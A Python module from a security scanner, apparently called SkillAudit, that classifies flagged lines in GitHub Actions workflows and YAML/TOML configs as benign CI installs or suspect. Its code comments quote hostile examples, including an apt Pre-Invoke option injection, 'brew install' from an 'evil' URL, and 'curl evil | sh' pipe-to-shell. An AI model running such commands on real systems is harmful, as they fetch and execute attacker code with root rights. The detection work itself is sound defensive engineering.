#!/usr/bin/env python3
"""YAML / GitHub-Actions workflow context classifier for SkillAudit (TRDD-a4260cc6).

Two shapes of YAML are routinely flagged by the matcher:

1. **GitHub Actions workflow files** (``.github/workflows/*.yml``).
   ``jobs.*.steps[*].run`` IS executed shell — the matcher SHOULD scan
   it. But common patterns like ``sudo apt-get install -y X`` are
   legitimate CI hygiene (the runner is an ephemeral VM with sudo
   access by design), not a real privilege-escalation attempt. We
   demote such known-safe install patterns to ``code_fence_neutral``.

2. **Regular YAML / TOML config** (``*.yaml``, ``*.yml``, ``*.toml``).
   Same SAFE_KEY / DANGEROUS_KEY split as JSON — ``description``,
   ``title``, ``keywords`` are documentation; ``command``, ``args``,
   ``script`` are execution.

For YAML / TOML, we route to the same SAFE_KEY allowlist used in
``_skillaudit_json_context``. For workflow files we add the
known-safe-CI-patterns layer on top.

Iron rule: parse failure → ``"unknown"``.
"""

from __future__ import annotations

import re
from typing import Final, Literal

from _skillaudit_json_context import _classify_key  # type: ignore[import-not-found]
from _skillaudit_shell_context import (  # type: ignore[import-not-found]
    _cmdsub_is_safe_data_command,
    _pipe_to_text_processor,
)

ContextVerdict = Literal["safe_literal", "safe_doc", "safe_schema", "code_fence_neutral", "suspect", "unknown"]

# Patterns that are legitimate in CI ``run:`` blocks but trigger
# PRIVILEGE_ESC / CMD_INJECTION. Each entry is matched as a substring
# on the full ``run:`` body. We DEMOTE rather than suppress because the
# user's iron rule says "better safe than sorry — agents triage".
_CI_KNOWN_SAFE_INSTALL_PATTERNS: Final[tuple[re.Pattern[str], ...]] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"\bsudo\s+apt(?:-get)?\s+(?:update|install|upgrade)\b",
        r"\bsudo\s+dnf\s+(?:install|upgrade|update)\b",
        r"\bsudo\s+yum\s+(?:install|update)\b",
        r"\bsudo\s+pacman\s+-S\b",
        r"\bsudo\s+apk\s+(?:add|update|upgrade)\b",
        r"\bbrew\s+(?:install|update|upgrade)\b",
        r"\bsudo\s+snap\s+install\b",
        r"\bsudo\s+systemctl\s+(?:restart|reload|start|stop)\b",
        r"\bsudo\s+chmod\s+\+x\b",
        r"\bsudo\s+mkdir\b",
    )
)


def _is_inside_workflow_run(file_path: str) -> bool:
    """True iff path is a GitHub Actions workflow file under ``.github/workflows/``."""
    norm = file_path.replace("\\", "/").lower()
    return "/.github/workflows/" in norm or norm.startswith(".github/workflows/")


def _line_is_in_run_block(lines: list[str], line_idx: int) -> bool:
    """Heuristic: is this line part of a ``run:`` block value?

    YAML doesn't carry rich line metadata in our stdlib without an
    extra dep, so we use a simple back-walk: find the nearest preceding
    line that starts with ``- run:`` or ``run:`` (possibly indented).
    If we hit a different YAML key at the same-or-shallower indent
    first, the line is NOT inside a run: block.

    This is approximate but sufficient for the calibration cases.
    """
    target = lines[line_idx]
    target_indent = len(target) - len(target.lstrip())

    run_open_re = re.compile(r"^(?P<indent>\s*)(?:-\s+)?run\s*:\s*(?P<inline>.*)$")
    other_key_re = re.compile(r"^(?P<indent>\s*)(?:-\s+)?(?!run\s*:|run\s*$)[A-Za-z_][\w-]*\s*:")

    for j in range(line_idx, -1, -1):
        line = lines[j]
        m_run = run_open_re.match(line)
        if m_run:
            indent = len(m_run.group("indent"))
            if indent < target_indent or (j == line_idx):
                # Multi-line block-scalar run: the indent of subsequent
                # lines must be greater than the run: line's indent.
                inline_val = m_run.group("inline").strip()
                if inline_val:
                    # Block-scalar indicators (``|`` ``>`` ``|-`` ``>-``
                    # ``|+`` ``>+``) mean the command body is on the
                    # FOLLOWING lines — those body lines belong to this
                    # run block. Only a GENUINE inline command
                    # (``run: echo hi``) limits the block to its own line.
                    if inline_val in ("|", ">", "|-", ">-", "|+", ">+"):
                        return True
                    return j == line_idx
                return True
        m_other = other_key_re.match(line)
        if m_other:
            other_indent = len(m_other.group("indent"))
            if other_indent < target_indent:
                # Hit a shallower YAML key first — we're not in a run.
                return False
    return False


def _has_known_safe_ci_pattern(line: str) -> bool:
    return any(p.search(line) for p in _CI_KNOWN_SAFE_INSTALL_PATTERNS)


# Issue #40 — airtight canonical-install discriminator. A ``run:`` value of
# the shape ``sudo <pkgmgr> install <bare packages>`` (optionally ``&&``-
# chained with MORE pkgmgr commands or benign no-ops) with NO shell
# metacharacter that enables arbitrary execution is a 100%-certain canonical
# CI install — suppress it rather than demote. The moment ANY segment is not a
# recognised-safe command, or any arbitrary-exec metacharacter appears
# (``|`` ``;`` ``$(`` backtick ``>`` ``<``), we fall back to demote.
_SHELL_EXEC_METACHARS_RE: Final[re.Pattern[str]] = re.compile(r"[|;<>`]|\$\(")

# Tokens that turn a metachar-free pkg-install line into arbitrary code execution
# WITHOUT any shell metacharacter, so the metachar guard above misses them
# (audit MAJOR #4):
#   * apt/dnf/yum config-option injection: ``-o APT::Update::Pre-Invoke::=id`` /
#     ``--option DPkg::Pre-Invoke=…`` and ``-c``/``--config-file`` load an apt
#     config that can carry the same Pre-Invoke hooks → root RCE.
#   * a remote URL fed to a package manager (``brew install http://evil/x.rb``,
#     ``dnf install http://…rpm``) executes arbitrary remote code. The ``://``
#     scheme separator is the tell; a legit ``pkg:arch`` / ``pkg=version`` spec
#     never contains it.
# A line carrying any of these is NOT certifiable-airtight → fall back to demote.
_DANGEROUS_INSTALL_TOKEN_RE: Final[re.Pattern[str]] = re.compile(
    r"(?:^|\s)(?:-o|--option|-c|--config-file)\b" r"|://",
    re.IGNORECASE,
)
_SAFE_RUN_SEGMENT_RE: Final[tuple[re.Pattern[str], ...]] = tuple(
    re.compile(p, re.IGNORECASE)
    for p in (
        r"^sudo\s+apt(?:-get)?\s+(?:update|upgrade|install)\b[\w\s.+:=-]*$",
        r"^sudo\s+dnf\s+(?:install|upgrade|update)\b[\w\s.+:=-]*$",
        r"^sudo\s+yum\s+(?:install|update)\b[\w\s.+:=-]*$",
        r"^sudo\s+apk\s+(?:add|update|upgrade)\b[\w\s.+:=-]*$",
        r"^sudo\s+pacman\s+-S(?:yu)?\b[\w\s.+:=-]*$",
        r"^sudo\s+snap\s+install\b[\w\s.+:=-]*$",
        r"^brew\s+(?:install|update|upgrade)\b[\w\s.+:@/-]*$",
        # benign no-ops that legitimately precede installs
        r"^set\s+-[eux]+(?:o\s+pipefail)?$",
        r"^echo\b[\w\s.,:=#'\"-]*$",
        r"^cd\s+[\w./-]+$",
    )
)


def _run_line_is_airtight_pkg_install(line: str) -> bool:
    """True iff the ``run:`` line is purely package-manager install/update
    commands (optionally ``&&``-chained with benign no-ops) and contains no
    arbitrary-exec metacharacter."""
    # Strip a leading ``run:`` / ``- run:`` / list-dash and surrounding quotes.
    body = re.sub(r"^\s*-?\s*(?:run\s*:)?\s*", "", line).strip().strip("'\"").strip()
    if not body:
        return False
    if _SHELL_EXEC_METACHARS_RE.search(body):
        return False
    # Metachar-free but still arbitrary-exec: apt config-option injection
    # (``-o …Pre-Invoke…``) or a remote-URL install (``://``). (audit MAJOR #4)
    if _DANGEROUS_INSTALL_TOKEN_RE.search(body):
        return False
    # A lone ``&`` (background) is also unsafe; only ``&&`` chaining is ok.
    if re.search(r"(?<!&)&(?!&)", body):
        return False
    segments = [s.strip() for s in body.split("&&") if s.strip()]
    if not segments:
        return False
    return all(any(p.match(seg) for p in _SAFE_RUN_SEGMENT_RE) for seg in segments)


def _walk_yaml_keys_naive(source: str) -> list[tuple[tuple[str, ...], int]]:
    """Return ``(path, line)`` pairs for every key-line in the YAML.

    Pure-Python regex walker — does NOT need PyYAML. Picks up
    block-style YAML only; flow-style ``{a: 1, b: 2}`` is treated as
    UNKNOWN by the caller.

    Path is the inferred dotted sequence based on indentation. List
    entries (``- item``) are represented as ``"[<n>]"``.
    """
    out: list[tuple[tuple[str, ...], int]] = []
    key_re = re.compile(r"^(?P<indent>[ \t]*)(?P<dash>-\s+)?(?P<key>[A-Za-z_$][\w.$-]*)\s*:")
    stack: list[tuple[int, str]] = []  # (indent_level, key)
    list_counters: dict[int, int] = {}

    for lineno, raw in enumerate(source.split("\n"), 1):
        if not raw.strip() or raw.lstrip().startswith("#"):
            continue
        m = key_re.match(raw)
        if not m:
            continue
        indent = len(m.group("indent").expandtabs(4))
        dash = bool(m.group("dash"))
        key = m.group("key")

        # Pop deeper-or-equal frames.
        while stack and stack[-1][0] >= indent:
            popped = stack.pop()
            list_counters.pop(popped[0], None)

        if dash:
            count = list_counters.get(indent, 0)
            list_counters[indent] = count + 1
            stack.append((indent, f"[{count}]"))
        stack.append((indent, key))

        path = tuple(seg for _, seg in stack)
        out.append((path, lineno))

    return out


def classify(
    file_path: str,
    source: str,
    line_idx: int,
    match: str,
    rule_id: str,
) -> ContextVerdict:
    """Classify a SkillAudit match in a YAML file (workflow or generic).

    See module docstring for the per-context verdict matrix.
    """
    lines = source.split("\n")
    if not (0 <= line_idx < len(lines)):
        return "unknown"

    line = lines[line_idx]

    # GitHub Actions workflow path? Known-safe CI install patterns are
    # demoted (not suppressed) because they ARE executed code, just in
    # an ephemeral CI runner. The user's agents triage these.
    if _is_inside_workflow_run(file_path):
        if _line_is_in_run_block(lines, line_idx):
            # Issue #40 — airtight canonical install (sudo <pkgmgr> install
            # <bare packages>, no arbitrary-exec metacharacters) is a
            # 100%-certain non-threat → suppress.
            if _run_line_is_airtight_pkg_install(line):
                return "safe_literal"
            # r01/r02 FP iter (2026-05-28) — a ``run:`` shell line is shell
            # code; reuse the shell classifier's safe command-substitution
            # logic. ``code=$(curl ... -w '%{http_code}')`` (capture),
            # ``$(ls -d plugins/*/ | wc -l)`` (count), ``$(cat "$CACHE_FILE")``
            # (read) are data queries, not injection. Genuine exec shapes
            # (``curl ... | bash``, ``eval "$(...)"``) stay visible via the
            # guards inside the shell helpers.
            if rule_id == "CMD_INJECTION" and (
                _cmdsub_is_safe_data_command(line, match)
                or _pipe_to_text_processor(line, match)
            ):
                return "safe_literal"
            if _has_known_safe_ci_pattern(line):
                return "code_fence_neutral"
            # In a run: block but not a known-safe pattern — let the
            # heuristic chain decide.
            return "unknown"
        # audit NIT #13: workflow file but NOT confidently inside a run:
        # block. The JSON-style SAFE_KEY allowlist below was built for
        # plugin.json / package.json METADATA — it is the wrong model for
        # workflow YAML, which is execution config. ``_line_is_in_run_block``
        # is also a heuristic back-walk that can misjudge multi-line
        # ``run: |`` block-scalar boundaries, so a real ``run:`` body line
        # could be mis-bucketed as non-run and then wrongly suppressed as a
        # SAFE_KEY (e.g. ``name: "… curl evil | sh"``). Defer to the
        # heuristic chain instead of suppressing.
        return "unknown"

    # Non-workflow YAML: use the key-path classifier.
    paths = _walk_yaml_keys_naive(source)
    if not paths:
        return "unknown"

    # Find the path whose line is the largest <= our target line.
    best_path: tuple[str, ...] = ()
    best_line = -1
    target_line = line_idx + 1
    for path, lineno in paths:
        if lineno <= target_line and lineno > best_line:
            best_line = lineno
            best_path = path

    if not best_path:
        return "unknown"

    return _classify_key(best_path)
